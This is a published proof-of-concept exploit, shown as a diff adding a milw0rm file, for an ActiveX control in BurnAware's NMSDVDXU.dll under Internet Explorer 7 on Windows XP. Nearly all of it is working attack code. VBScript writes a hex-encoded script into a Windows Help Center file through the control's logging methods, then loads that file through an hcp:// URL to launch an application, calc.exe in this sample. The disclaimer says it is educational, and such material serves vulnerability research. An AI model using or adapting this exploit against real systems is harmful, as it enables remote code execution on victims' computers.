@@ -1,0 +1,60 @@
+-----------------------------------------------------------------------------
+ BurnAware NMSDVDXU ActiveX Control Remote Arbitrary File Creation/Execution
+ url: http://www.burnaware.com
+
+ File:   NMSDVDXU.dll <= 1.0.0.13
+ CLSID:  {0355854A-7F23-47E2-B7C3-97EE8DD42CD8}
+ ProgID: NMSDVDX.DVDEngineX.1
+ Descr.: DVDEngineX Class
+
+ Marked as:
+ RegKey Safe for Script: False
+ RegKey Safe for Init: False
+ Implements IObjectSafety: True
+ IDisp Safe: Safe for untrusted: caller,data
+ IPersist Safe: Safe for untrusted: caller,data
+ IPStorage Safe: Safe for untrusted: caller,data
+
+ Author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://www.shinnai.net
+
+ This was written for educational purpose. Use it at your own risk.
+ Author will be not responsible for any damage.
+
+ Tested on Windows XP Professional SP3 all patched, with Internet Explorer 7
+
+ myMsinfo is just hexadecimal values of:
+
+ <object classid='clsid:0355854A-7F23-47E2-B7C3-97EE8DD42CD8' id='compatUI'></object>
+ <script language='vbscript'>
+ compatUI.RunApplication 1, "calc.exe", 1
+ </script>
+-----------------------------------------------------------------------------
+<object classid='clsid:C2FBBB5F-6FF7-4F6B-93A3-7EDB509AA938' id='test'></object>
+
+<input language=VBScript onclick=tryMe() type=button value='Click here to start the test'>
+
+<script language='vbscript'>
+ Sub tryMe
+  myMsinfo = unescape("%3C%6F%62%6A%65%63%74%20%63%6C%61%73%73%69%64%3D") & _
+             unescape("%27%63%6C%73%69%64%3A%30%33%35%35%38%35%34%41%2D") & _
+             unescape("%37%46%32%33%2D%34%37%45%32%2D%42%37%43%33%2D%39") & _
+             unescape("%37%45%45%38%44%44%34%32%43%44%38%27%20%69%64%3D") & _
+             unescape("%27%63%6F%6D%70%61%74%55%49%27%3E%3C%2F%6F%62%6A") & _
+             unescape("%65%63%74%3E%0D%0A%3C%73%63%72%69%70%74%20%6C%61") & _
+             unescape("%6E%67%75%61%67%65%3D%27%76%62%73%63%72%69%70%74") & _
+             unescape("%27%3E%0D%0A%63%6F%6D%70%61%74%55%49%2E%52%75%6E") & _
+             unescape("%41%70%70%6C%69%63%61%74%69%6F%6E%20%31%2C%20%22") & _
+             unescape("%63%61%6C%63%2E%65%78%65%22%2C%20%31%0D%0A%3C%2F") & _
+             unescape("%73%63%72%69%70%74%3E")
+
+  test.Initialize True
+  test.EnableLog "C:\\WINDOWS\\PCHEALTH\\HELPCTR\\System\\sysinfo\\msinfo.htm", True
+  test.LogMessage myMsinfo
+
+  window.location = "hcp://system/sysinfo/msinfo.htm"
+ End Sub
+</script>
+
+# milw0rm.com [2008-09-24]
